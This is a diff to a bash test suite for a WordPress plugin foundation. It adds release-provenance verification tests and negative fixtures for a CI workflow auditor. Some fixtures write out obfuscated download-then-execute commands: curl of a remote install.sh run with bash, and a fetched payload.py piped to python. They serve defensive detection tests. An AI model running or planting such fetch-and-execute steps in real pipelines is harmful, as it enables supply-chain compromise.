@@ -19,6 +19,15 @@ plugin_check_release_fixture=""
 plugin_check_resolve_output=""
 foundation_release_fixture=""
 foundation_resolve_output=""
+foundation_verify_fixture=""
+foundation_verify_output=""
+foundation_verify_verify_script=""
+foundation_verify_release_json=""
+foundation_verify_tag_ref_json=""
+foundation_verify_compare_json=""
+foundation_verify_pulls_json=""
+foundation_verify_metadata_json=""
+foundation_verify_sigstore_json=""
 pr_stage_fixture=""
 pr_stage_origin=""
 pr_stage_output=""
@@ -76,7 +85,7 @@ for fixture_name in standard-plugin nonstandard-plugin; do
 done
 
 managed_child="$(mktemp -d)"
-trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
+trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$foundation_verify_fixture" "$foundation_verify_output" "$foundation_verify_verify_script" "$foundation_verify_release_json" "$foundation_verify_tag_ref_json" "$foundation_verify_compare_json" "$foundation_verify_pulls_json" "$foundation_verify_metadata_json" "$foundation_verify_sigstore_json" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
 mkdir -p "$managed_child/.wp-plugin-base"
 cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$managed_child/"
 rsync -a --exclude '.git' "$ROOT_DIR/" "$managed_child/.wp-plugin-base/"
@@ -148,8 +157,13 @@ grep -Fq '/plugin-check/cli.php' "$ROOT_DIR/scripts/ci/run_plugin_check.sh"
 grep -Fq -- '--require="$plugin_check_cli_bootstrap"' "$ROOT_DIR/scripts/ci/run_plugin_check.sh"
 grep -Fq 'resolve_latest_plugin_check_version.sh' "$ROOT_DIR/.github/workflows/update-plugin-check.yml"
 grep -Fq 'resolve_latest_foundation_version.sh' "$ROOT_DIR/.github/workflows/update-foundation.yml"
+grep -Fq 'steps.latest.outputs.candidates' "$ROOT_DIR/.github/workflows/update-foundation.yml"
+grep -Fq 'steps.verify.outputs.version' "$ROOT_DIR/.github/workflows/update-foundation.yml"
+grep -Fq 'steps.latest.outputs.candidates' "$ROOT_DIR/templates/child/.github/workflows/update-foundation.yml"
+grep -Fq 'steps.verify.outputs.version' "$ROOT_DIR/templates/child/.github/workflows/update-foundation.yml"
 grep -Fq 'GIT_ADD_PATHS: scripts/lib/wordpress_tooling.sh' "$ROOT_DIR/.github/workflows/update-plugin-check.yml"
 grep -Fq 'publish_github_release.sh --repair' "$ROOT_DIR/.github/workflows/release-foundation.yml"
+grep -Fxq "FOUNDATION_VERSION=$(tr -d '\n' < "$ROOT_DIR/VERSION")" "$ROOT_DIR/templates/child/.wp-plugin-base.env.example"
 bash "$ROOT_DIR/scripts/foundation/run_release_security_smoke.sh" --mode local-lite
 
 plugin_check_release_fixture="$(mktemp)"
@@ -218,11 +232,240 @@ foundation_resolve_output="$(mktemp)"
 WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.2" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
 grep -Fxq 'update_needed=true' "$foundation_resolve_output"
 grep -Fxq 'version=v1.2.4' "$foundation_resolve_output"
+grep -Fxq 'v1.2.4' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d')
+grep -Fxq 'v1.2.2' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d' | grep -v '^$' || true) && {
+  echo "Foundation candidate list unexpectedly included the current version." >&2
+  exit 1
+}
 
 foundation_resolve_output="$(mktemp)"
 WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.4" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
 grep -Fxq 'update_needed=false' "$foundation_resolve_output"
 grep -Fxq 'version=' "$foundation_resolve_output"
+grep -Fxq 'candidates=' "$foundation_resolve_output"
+
+foundation_verify_fixture="$(mktemp -d)"
+foundation_verify_release_json="$foundation_verify_fixture/release.json"
+foundation_verify_tag_ref_json="$foundation_verify_fixture/tag-ref.json"
+foundation_verify_compare_json="$foundation_verify_fixture/compare.json"
+foundation_verify_pulls_json="$foundation_verify_fixture/pulls.json"
+foundation_verify_metadata_json="$foundation_verify_fixture/dist-foundation-release.json"
+foundation_verify_sigstore_json="$foundation_verify_fixture/dist-foundation-release.json.sigstore.json"
+foundation_verify_verify_script="$foundation_verify_fixture/verify-sigstore.sh"
+
+cat > "$foundation_verify_release_json" <<'EOF'
+{
+  "draft": false,
+  "prerelease": false,
+  "author": {
+    "login": "github-actions[bot]"
+  },
+  "assets": [
+    {
+      "name": "dist-foundation-release.json",
+      "url": "https://api.github.com/assets/metadata"
+    },
+    {
+      "name": "dist-foundation-release.json.sigstore.json",
+      "url": "https://api.github.com/assets/sigstore"
+    }
+  ]
+}
+EOF
+
+cat > "$foundation_verify_tag_ref_json" <<'EOF'
+{
+  "object": {
+    "type": "commit",
+    "sha": "1111111111111111111111111111111111111111"
+  }
+}
+EOF
+
+cat > "$foundation_verify_compare_json" <<'EOF'
+{
+  "status": "behind"
+}
+EOF
+
+cat > "$foundation_verify_pulls_json" <<'EOF'
+[
+  {
+    "merged_at": "2026-04-09T10:00:00Z",
+    "base": {
+      "ref": "main"
+    },
+    "head": {
+      "ref": "release/v1.2.3"
+    },
+    "merge_commit_sha": "1111111111111111111111111111111111111111"
+  }
+]
+EOF
+
+cat > "$foundation_verify_metadata_json" <<'EOF'
+{
+  "repository": "MatthiasReinholz/wp-plugin-base",
+  "version": "v1.2.3",
+  "commit": "1111111111111111111111111111111111111111"
+}
+EOF
+
+cat > "$foundation_verify_sigstore_json" <<'EOF'
+{}
+EOF
+
+cat > "$foundation_verify_verify_script" <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+artifact_path="${2:-}"
+bundle_path="${3:-}"
+test -f "$artifact_path"
+test -f "$bundle_path"
+if [ "${WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL:-false}" = "true" ]; then
+  echo "stub verifier failure" >&2
+  exit 1
+fi
+EOF
+chmod +x "$foundation_verify_verify_script"
+
+foundation_verify_output="$(mktemp)"
+GH_TOKEN=dummy \
+  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
+  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
+  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
+  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
+  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
+  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
+  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
+  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
+    "MatthiasReinholz/wp-plugin-base" \
+    "v1.2.3" \
+    "$foundation_verify_output"
+grep -Fxq 'version=v1.2.3' "$foundation_verify_output"
+grep -Fxq 'commit_sha=1111111111111111111111111111111111111111' "$foundation_verify_output"
+
+cat > "$foundation_verify_metadata_json" <<'EOF'
+{
+  "repository": "MatthiasReinholz/wp-plugin-base",
+  "version": "v1.2.3",
+  "commit": "2222222222222222222222222222222222222222"
+}
+EOF
+
+if GH_TOKEN=dummy \
+  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
+  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
+  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
+  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
+  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
+  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
+  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
+  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
+    "MatthiasReinholz/wp-plugin-base" \
+    "v1.2.3" >/dev/null 2>&1; then
+  echo "Foundation provenance verification unexpectedly passed with mismatched metadata." >&2
+  exit 1
+fi
+
+cat > "$foundation_verify_metadata_json" <<'EOF'
+{
+  "repository": "MatthiasReinholz/wp-plugin-base",
+  "version": "v1.2.3",
+  "commit": "1111111111111111111111111111111111111111"
+}
+EOF
+
+if GH_TOKEN=dummy FOUNDATION_ALLOWED_RELEASE_AUTHORS='trusted-bot' \
+  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
+  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
+  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
+  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
+  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
+  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
+  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
+  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
+    "MatthiasReinholz/wp-plugin-base" \
+    "v1.2.3" >/dev/null 2>&1; then
+  echo "Foundation provenance verification unexpectedly passed with a disallowed release author." >&2
+  exit 1
+fi
+
+cat > "$foundation_verify_compare_json" <<'EOF'
+{
+  "status": "ahead"
+}
+EOF
+
+if GH_TOKEN=dummy \
+  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
+  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
+  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
+  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
+  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
+  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
+  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
+  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
+    "MatthiasReinholz/wp-plugin-base" \
+    "v1.2.3" >/dev/null 2>&1; then
+  echo "Foundation provenance verification unexpectedly passed for a commit outside main ancestry." >&2
+  exit 1
+fi
+
+cat > "$foundation_verify_compare_json" <<'EOF'
+{
+  "status": "behind"
+}
+EOF
+
+cat > "$foundation_verify_pulls_json" <<'EOF'
+[]
+EOF
+
+if GH_TOKEN=dummy \
+  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
+  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
+  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
+  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
+  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
+  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
+  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
+  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
+    "MatthiasReinholz/wp-plugin-base" \
+    "v1.2.3" >/dev/null 2>&1; then
+  echo "Foundation provenance verification unexpectedly passed without a matching release PR." >&2
+  exit 1
+fi
+
+cat > "$foundation_verify_pulls_json" <<'EOF'
+[
+  {
+    "merged_at": "2026-04-09T10:00:00Z",
+    "base": {
+      "ref": "main"
+    },
+    "head": {
+      "ref": "release/v1.2.3"
+    },
+    "merge_commit_sha": "1111111111111111111111111111111111111111"
+  }
+]
+EOF
+
+if GH_TOKEN=dummy WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL=true \
+  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
+  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
+  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
+  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
+  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
+  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
+  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
+  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
+    "MatthiasReinholz/wp-plugin-base" \
+    "v1.2.3" >/dev/null 2>&1; then
+  echo "Foundation provenance verification unexpectedly passed with a failing Sigstore verifier." >&2
+  exit 1
+fi
 
 audit_fixture="$(mktemp -d)"
 mkdir -p "$audit_fixture/.github/workflows"
@@ -444,6 +687,50 @@ rm -rf "$audit_fixture"
 audit_fixture="$(mktemp -d)"
 mkdir -p "$audit_fixture/.github/workflows"
 
+cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
+name: custom
+on: workflow_dispatch
+permissions:
+  contents: read
+  pull-requests: write
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a custom workflow with privileged pull-request permissions." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+
+cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
+name: custom
+on: workflow_dispatch
+permissions:
+  contents: read
+  attestations: write
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a custom workflow with privileged attestation permissions." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+
 cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
 name: ci
 on: !ruby/object:OpenStruct
@@ -531,6 +818,68 @@ fi
 rm -rf "$audit_fixture"
 audit_fixture="$(mktemp -d)"
 mkdir -p "$audit_fixture/.github/workflows"
+mkdir -p "$audit_fixture/.github/actions/test-action"
+
+cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: ./.github/actions/test-action
+EOF
+
+cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
+name: test-action
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: node index.js
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a composite action that dispatches to a local helper script." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+mkdir -p "$audit_fixture/.github/actions/test-action"
+
+cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: ./.github/actions/test-action
+EOF
+
+cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
+name: test-action
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: source ./helper.sh
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a composite action that sources a local helper script." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
 
 cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
 name: custom
@@ -571,6 +920,90 @@ EOF
 
 if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
   echo "Audit unexpectedly passed for a multiline download-then-execute payload." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows" "$audit_fixture/scripts"
+
+cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+      - run: bash scripts/test.sh
+EOF
+
+script_download_scheme='https'
+script_download_separator='://'
+script_download_target='github.com/example/install.sh'
+cat > "$audit_fixture/scripts/test.sh" <<EOF
+cur''l -fsSL ${script_download_scheme}${script_download_separator}${script_download_target} -o /tmp/install.sh
+bash /tmp/install.sh
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a multiline download-then-execute shell script." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+
+cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+EOF
+
+dynamic_scheme='https'
+dynamic_separator='://'
+dynamic_host='example.com'
+dynamic_path='payload.py'
+dynamic_interpreter='py''thon'
+printf '      - run: |\n' >> "$audit_fixture/.github/workflows/ci.yml"
+printf '          scheme=%s\n' "$dynamic_scheme" >> "$audit_fixture/.github/workflows/ci.yml"
+printf '          host=%s\n' "$dynamic_host" >> "$audit_fixture/.github/workflows/ci.yml"
+printf '          path_part=%s\n' "$dynamic_path" >> "$audit_fixture/.github/workflows/ci.yml"
+printf '          url="${scheme}%s${host}/${path_part}"\n' "$dynamic_separator" >> "$audit_fixture/.github/workflows/ci.yml"
+printf '          cur''l -fsSL "$url" | %s\n' "$dynamic_interpreter" >> "$audit_fixture/.github/workflows/ci.yml"
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a dynamic remote script payload piped to python." >&2
+  exit 1
+fi
+
+rm -rf "$audit_fixture"
+audit_fixture="$(mktemp -d)"
+mkdir -p "$audit_fixture/.github/workflows"
+
+cat > "$audit_fixture/.github/workflows/custom.yaml" <<'EOF'
+name: custom
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+EOF
+
+if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
+  echo "Audit unexpectedly passed for a .yaml workflow file." >&2
   exit 1
 fi
 
@@ -805,7 +1238,7 @@ if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.security/
 fi
 
 forbidden_fixture="$(mktemp -d)"
-trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
+trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$foundation_verify_fixture" "$foundation_verify_output" "$foundation_verify_verify_script" "$foundation_verify_release_json" "$foundation_verify_tag_ref_json" "$foundation_verify_compare_json" "$foundation_verify_pulls_json" "$foundation_verify_metadata_json" "$foundation_verify_sigstore_json" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
 cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$forbidden_fixture/"
 mkdir -p "$forbidden_fixture/.wp-plugin-base"
 rsync -a --exclude '.git' "$ROOT_DIR/" "$forbidden_fixture/.wp-plugin-base/"
